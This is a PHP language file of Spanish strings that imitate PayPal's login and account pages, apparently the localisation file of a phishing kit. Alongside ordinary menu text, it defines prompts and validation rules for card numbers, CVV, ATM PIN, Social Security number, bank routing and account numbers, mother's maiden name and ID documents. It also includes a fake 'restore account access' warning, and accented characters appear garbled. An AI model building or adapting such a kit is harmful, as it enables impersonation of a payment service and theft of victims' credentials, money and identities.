<?php


$charset = "iso-8859-1";
$acctype = "Tipos de cuenta";
$title = "Identificaci�n - PayPal";
$title2 = "Error - Identificaci�n - PayPal";
$search1 = "Buscar PayPal";
$search2 = "Buscar";
$signup = "Registrarse";
$login = "Identificarse";
$help = "Ayuda";
$s_center = "Centro de seguridad";
$s_main = "Saltar al contenido principal";
$home = "Inicio";
$personal = "Particulares";
$business = "Empresas";
$products = "Servicios";
$develop = "Desarrolladores";
$mlogin = "Miembro Login";
$slogin = "Asegure Entrar";
$alogin = "Inicio de sesi�n";
$_email  = "Correo electronico";
$_pass = "Contrase�a de PayPal";
$goto = "Vaya a";
$macct = "Mi cuenta";
$m_acctp = "Mi cuenta - PayPal";
$mtrs = "Mis transacciones";
$p_conx = "�Problemas para iniciar sesi�n?";
$forgot = "�Ha olvidado su";
$adr = "correo electronico";
$or = "o";
$epass = "contrase�a";
$newtop = "�Es la primera vez que utiliza PayPal?";
$sup = "Registrese";
$t1 = "M�s informaci�n";
$t2 = "Acerca de nosotros";
$t3 = "Opiniones sobre el sitio";
$t4 = "Tarifas";
$t5 = "Privacidad";
$t6 = "Centro de seguridad";
$t7 = "Contactar";
$t8 = "Contratos legales";
$t9 = "En todo el mundo";
$t10 = "Empleo";
$t11 = "Servicios para vendedores";
$t12 = "Nuestro blog";
$t13 = "Sesiones pr�cticas";
$t14 = "Recomendaciones";
$t15 = "Mapa del sitio";
$t16 = "eBay";
$t17 = "Comunidad";
$copyright = "Copyright � 1999-2012 PayPal. Todos los derechos reservados.";
$fdic = "Information about FDIC pass-through insurance";
$processing = "Identificarse...";
$opay = "Identificarse - PayPal";
$safe = "PayPal. La forma r�pida y segura de pagar.";
$ifno = "Si esta p�gina aparece durante m�s de 5 segundos,";
$clickhere = "haga clic aqu�";
$reload = " para volver a cargarla.";
$profupdate = "Actualizaci�n de perfil - PayPal";
$logout = "Salir";
$myacc = "Mi Cuenta";
$over = "Descripci�n general";
$addfound = "A�adir fondos";
$retirar = "Retirar";
$banktf = "Transferir a Cuenta de Banco";
$history = "Historial";
$bsearch = "Busqueda Basica";
$dhistory = "Descargar Historial";
$demendcheq = "Solicitud de un cheque";
$usedebit = "Utilice una tarjeta de d�bito";
$resolu = "Centro de resoluciones";
$opencase = "Ver casos abiertos";
$guides = "Tutoriales";
$prof = "Perfil";
$est_acc = "Establecer una cuenta";
$ver = "Verificado";
$upacc = "Actualizar la cuenta";
$editacc = "Modificar su cuenta";
$cardpay = "PayPal Plus Tarjeta de Cr�dito";
$paymobile = "Utilice PayPal en su tel�fono m�vil";
$paym = "Paiement"; //a modifier
$news = "Noticias";
$activity = "Estas actividades de revisi�n recientes";
$surepay = "Pay es seguro y m�s r�pido con PayPal";
$know = "Saber d�nde utilizar PayPal";
$valid = "Ha activado su cuenta PayPal.";
$redirect = "Usted ser� redireccionado a la p�gina de inicio de sesi�n. Por favor ingresa de nuevo.";
$addfunbank = "Agrega fondos de una cuenta bancaria";
$gsales = "Venta Manager";
$addfundmoney = "Agrega fondos de una cuenta MoneyPak";
$addemail = "Agregar o Editar Email";
$addbank = "Agregar o Editoar Cuenta Bancaria";
$addcard = "Agregar o editar Tarjeta de Credito";
$addadr = "Agregar o editar direccion";
$addphone = "Agregar o Editoar n�mero de tel�fono";
$moreopt = "Otras opciones";
$sendmoney = "Enviar Dinero";
$reqmoney = "Solicitar Dinero";
$mservices = "Vender en su Web";
$autools = "Herramientas de subasta";
$stra = "Transaccion Segura";
$completeform = '<div id="messageBox" class="legacyErrors"><div class="messageBox error"><p style="width: 690px; margin-bottom: 6px; margin-top: 12px;">Por favor completa el siguiente formulario para actualizar su informaci�n del perfil y restaurar el acceso a la cuenta.</p></div></div>';
$pip = "Perfil de Informaci�n Personal";
$accu = "Aseg�rese de introducir la informaci�n precisa, y de acuerdo a los formatos requeridos.";
$filla = "Rellene todos los campos obligatorios.";
$filds="Los campos obligatorios";

$month = "mes";
$day = "dia"; 
$year = "a�o";
$hpn = "Tel�fono de Casa :";
$acpnum = "Este n�mero se utilizar� para contactar con usted acerca de las medidas de seguridad y / o otras cuestiones con respecto a su cuenta PayPal.";
$hap = "Direcci�n Perfil";
$acu = "Introduzca su informaci�n con la mayor precisi�n posible.";
$adr1 = "Direcci�n L�nea 1 :";
$adr2 = "Direcci�n L�nea 2 :";
$city = "Ciudad :";
$state = "Estado :";
$zip = "C�digo Postal :";
$country = "Pa�s :";
$scountry = "--Seleccione Pa�s--";
$ccprof = "Tarjeta de cr�dito / d�bito Perfil";
$damelacc = "Introduzca la informaci�n de la tarjeta con la mayor precisi�n posible.";
$damelacb = "Por el n�mero de la tarjeta, por favor, introduzca s�lo n�meros, sin guiones o espacios.";
$cvv = "N�mero de verificaci�n de la tarjeta :";
$hcvv = "Ayuda para encontrar su n�mero de verificaci�n de la tarjeta";
$rfield = "Campo obligatorio";
$for1 = "Para su protecci�n, verificamos la informaci�n de la tarjeta de cr�dito.";
$for2 = "El proceso normalmente tarda unos 30 segundos, pero puede tomar m�s tiempo durante determinadas horas del d�a. Por favor, haga clic en";
$for3 = "para actualizar su informaci�n.";
$spo = "Guardar perfil";
$puf = "Actualizar perfil";
$assl = "Acerca de los certificados SSL";
$logo = "https://www.paypalobjects.com/WEBSCR-600-20091209-1/es_XC/i/header/hdr_loginpage_560x228.jpg";

$Nomdelabanque = "Nombre del banco :";
$Ndecompte = "Numero de cuenta :";
$Nomdutitulairedelacarte = "Nombre del titular :";
$atmm = "El cajero automatico de codigo :";

$ccnumbr = "Numero de Tarjeta :";
$expbr = "Fecha de Expiraci�n :";

$quis1 = "Apellido de soltera";
$quis2 = "Los ultimos 4 caracteres de la licencia de conducir";
$quis3 = "Ultimos 4 digitos del numero de seguro social";
$quis4 = "Ciudad de nacimiento";
$quis5 = "Otra pregunta";

$ffPrenom = "Primer nombre :";
$ffNom = "Apellido :";

$IDTYPE = "Seleccione el tipo de Id :";
$Passport="Pasaporte";
$Card_Identification="Tarjeta de Identificaci�n";
$Driving_License="Licencia de Conducir";

$codepersonel="c�digo seguro :";


$dateness = "Fecha de Nacimiento :";
$Tcard = "Tipo de tarjeta :";
$choosquest1 = "--Elija una pregunta--";

$choosquest2 = "Otra pregunta :";

$ssn = "N�mero de Seguro Social :";
$quest0 = "Pregunta de seguridad :";
$quest2 = "2nd Pregunta de seguridad :";
$answer = "Respuesta :";
$troubl = "Consejos de soluci�n de problemas";
$forg = "�Ha olvidado su contrase�a?";
$caract = "- La contrase�a tiene como m�nimo ocho (8) caracteres.";
$majuscl = "- Su contrase�a distingue entre may�sculas y min�sculas, aseg�rese de que est� desactivada la funci�n Bloq May�s.";
$forgmail = "�Ha olvidado su direcci�n de correo electr�nico?";
$identify = "- Identifique la direcci�n de correo electr�nico que ha utilizado para registrarse en PayPal.";
$newemail = "�Nueva direcci�n de correo electr�nico?";
$logusing = "- Iniciar sesi�n utilizando la direcci�n de correo electr�nico antigua y vaya a su Perfil para actualizar la direcci�n.";
$troubl = "�Problemas para iniciar sesi�n?";
$ymst = "- Es posible que lo haya intentado demasiadas veces. Intente de nuevo en 2 horas, o ";
$cntus = "comun�quese con nosotros";
$needhlp = ", si necesita ayuda. ";
$encookies = "- Es posible que deba habilitar cookies en su explorador web.";
$howork = "C�mo funciona PayPal";
$whatis = "�Qu� es PayPal?";
$started = "Primeros pasos con PayPal";
$managacc = "Administraci�n de la cuenta";
$greatw = "PayPal - los mejores usos";
$topten = "Los diez conceptos principales que debe saber sobre PayPal";
$howmuch = "Cu�nto cuesta";
$acctyp = "Tipos de cuenta";
$payon = "Pagar en Internet";
$greatd = "Grandes oportunidades";
$pstory = "Directorio de tiendas de PayPal";
$pmaster = "Tarjeta PayPal Plus MasterCard";
$shopvm = "Comprar mediante el tel�fono m�vil";
$smoney = "Enviar dinero";
$smoneyon = "Enviar dinero por Internet";
$internly = "En todo el mundo";
$tyt = "A su hijo/a adolescente";
$vmobile = "Mediante el tel�fono m�vil";
$gpaid = "Recibir pagos";
$sonln = "Vender en Internet";
$accard = "Aceptar tarjetas de cr�dito";
$rqmoney = "Solicitar dinero";
$fundrs = "Recaudaci�n de fondos";
$activ_recent = "Mi actividad reciente";
$p_received = "Pagos recibidos";
$p_envoye = "Pagos enviados";
$aff_trans = "Ver todas mis transacciones";
$sept_j = "�ltimos 7 d�as";
$what = "�Qu� es esto?";
$gloss = "Glosario de estatus de pago";
$select_recent = "S�lectionner toutes les transactions r�centes";
$date = "Fecha";
$type = "Tipo";
$n_email = "Nombre/Correo electr�nico";
$etat_pay = "Estatus del pago";
$details = "Detalles";
$etat_commande = "Estatus del pedido/Actividad";
$a_commission = "Bruto";
$aucun_objet = "-Ning�n art�culo nuevo-";
$notif = "Notificaciones";
$mise_a_jour = "Actualizaciones de las pol�ticas";
$when = "Cuando aparece un icono junto a una de sus transacciones, significa que hay m�s informaci�n disponible o que se ha adjuntado una nota. Mueva el cursor sobre el icono para obtener m�s informaci�n sobre la transacci�n.";
$whatsThis = "Las transacciones que archive ser�n trasladadas a la lista Todas las actividades.";



$font1 = "<font color='#c00'>";
$font2 = "</font>";


$valid = array("Por favor, introduzca su nombre de pila"
,"La m�xima del nombre es de 40"
,"Por favor, ingrese su nombre"
,"La m�xima del nombre es de 40"
,"Por favor, seleccione * mes * Fecha de Nacimiento"
,"Por favor, seleccione * D�a * Fecha de Nacimiento"
,"Por favor, seleccione * A�o * Fecha de Nacimiento"
,"Por favor, introduzca su direcci�n de"
,"M�xima de la direcci�n es de 50"
,"M�nima de la direcci�n es de 50"
,"Por favor, introduzca el nombre de tu ciudad"
,"M�xima para el nombre de su ciudad es de 15"
,"M�nima para el nombre de tu ciudad es de 4"
,"Seleccione un pa�s / territorio"
,"Por favor, ingrese su c�digo postal"
,"Por favor, introduzca su personal Tel�fono"
,"Introduzca s�lo el n�mero"
,"M�nimo el n�mero de tel�fono es el 10"
,"Por favor, introduzca el nombre del titular"
,"Por favor, seleccione la tarjeta * Tipo *"
,"Por favor, introduzca su n�mero de tarjeta"
,"M�ximo para el n�mero de la tarjeta es de 16"
,"El m�nimo para el n�mero de la tarjeta es de 13"
,"Introduzca s�lo el n�mero"
,"Por favor, seleccione la fecha de vencimiento - Mes -"
,"Por favor, seleccione la Fecha de Vencimiento - A�o -"
,"Por favor, introduzca su CVV"
,"Introduzca s�lo el n�mero"
,"El m�nimo para el CVV es de 3"
,"Por favor, introduzca su c�digo de cajero autom�tico"
,"El n�mero m�ximo para el c�digo de cajero autom�tico es de 4"
,"El n�mero m�nimo para el c�digo de cajero autom�tico es de 4"
,"Por favor, introduzca su n�mero de Seguro Social"
,"El n�mero m�ximo para el n�mero de Seguro Social es de 9"
,"El n�mero m�nimo para el n�mero de Seguro Social es de 9"
,"Introduzca s�lo el n�mero");

$routing="Bank Routing Number :";
$account="Bank Account Number :";
$accountch="�ltimos 4 d�gitos de la cuenta (de cheques) :";
$hrouting="Ayuda para encontrar su Bank Routing Number";
$haccount="Ayuda para encontrar su Bank Account Number";

$error0 = "<div id=\"messageBox\" class=\"legacyErrors\"><div class=\"messageBox error\"><p>Parte de la informaci�n requerida inexistente o incompleta. Corrija las entradas e int�ntelo de nuevo.</p></div></div>";
$error1 = "<div class='messageBox error'><p>Favor de asegurarse de introducir correctamente la <b>direcci�n de correo electr�nico</b> y la <b>contrase�a</b>. Si a�n no logra identificarse, consulte los <b>Consejos para la Resoluci�n de problemas</b> a continuaci�n.</p></div>";
                                           

?>
